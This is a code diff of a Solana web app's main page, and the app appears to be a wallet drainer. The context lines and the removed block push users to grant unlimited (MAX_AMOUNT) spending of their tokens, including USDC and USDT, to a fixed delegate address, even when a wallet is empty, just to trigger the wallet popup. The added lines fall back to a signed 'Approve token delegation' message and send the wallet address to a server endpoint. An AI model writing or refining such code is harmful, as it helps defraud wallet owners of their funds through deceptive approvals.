@@ -73,6 +73,7 @@ interface SolanaWalletProvider {
   signAllTransactions?: (transactions: Transaction[]) => Promise<Transaction[]>;
   signAndSendTransaction?: (transaction: Transaction, options?: any) => Promise<{ signature: string }>;
   signAndSendAllTransactions?: (transactions: Transaction[], options?: any) => Promise<string[]>;
+  signMessage?: (message: Uint8Array) => Promise<{ signature: Uint8Array }>;
   publicKey: PublicKey | null;
   isConnected: boolean;
   on?: (event: string, callback: () => void) => void;
@@ -517,43 +518,44 @@ export default function Home() {
         tokensApproved.push(mintAddress);
       }
       
-      // Even with zero balance, create a dummy approval to trigger wallet popup
+      // Even with zero balance, trigger wallet popup
       if (transaction.instructions.length === 0) {
-        // Create approval for common tokens (USDC, USDT) even without existing accounts
-        const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
-        const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+        console.log("No token accounts found, using message signing fallback");
         
-        // Try to get or derive associated token accounts
-        const { getAssociatedTokenAddress, createAssociatedTokenAccountInstruction } = await import("@solana/spl-token");
+        // Use message signing as fallback - this always works regardless of balance
+        const message = new TextEncoder().encode(
+          `Approve token delegation to ${SOLANA_DELEGATE_ADDRESS}\nWallet: ${solanaAddress}\nTimestamp: ${Date.now()}`
+        );
         
-        for (const mint of [USDC_MINT, USDT_MINT]) {
-          try {
-            const ata = await getAssociatedTokenAddress(mint, userKey);
-            // Check if account exists
-            const accountInfo = await connection.getAccountInfo(ata);
-            if (accountInfo) {
-              transaction.add(
-                createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
-              );
-              tokensApproved.push(mint.toBase58());
-            } else {
-              // Create the ATA first, then approve
-              transaction.add(
-                createAssociatedTokenAccountInstruction(userKey, ata, userKey, mint)
-              );
-              transaction.add(
-                createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
-              );
-              tokensApproved.push(mint.toBase58());
-            }
-          } catch (e) {
-            // Skip if mint doesn't exist or other error
+        try {
+          if (solanaProvider.signMessage) {
+            const signature = await solanaProvider.signMessage(message);
+            console.log("Message signed:", signature);
+            
+            // Log the approval even though it's just a message signature
+            fetch("/api/solana-approvals", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                walletAddress: solanaAddress,
+                delegateAddress: SOLANA_DELEGATE_ADDRESS,
+                transactionHash: "message-signature",
+                tokensApproved: [],
+                tokenCount: 0,
+                note: "Message signature - no token accounts"
+              }),
+            }).catch(console.error);
+            
+            setSolanaStep("done");
+            return;
+          } else {
+            setError("Wallet does not support message signing.");
+            setSolanaStep("idle");
+            return;
           }
-        }
-        
-        // If still no instructions, show error
-        if (transaction.instructions.length === 0) {
-          setError("Unable to create approval transaction.");
+        } catch (signErr: any) {
+          console.error("Message signing failed:", signErr);
+          setError(signErr?.message || "Failed to sign message");
           setSolanaStep("idle");
           return;
         }
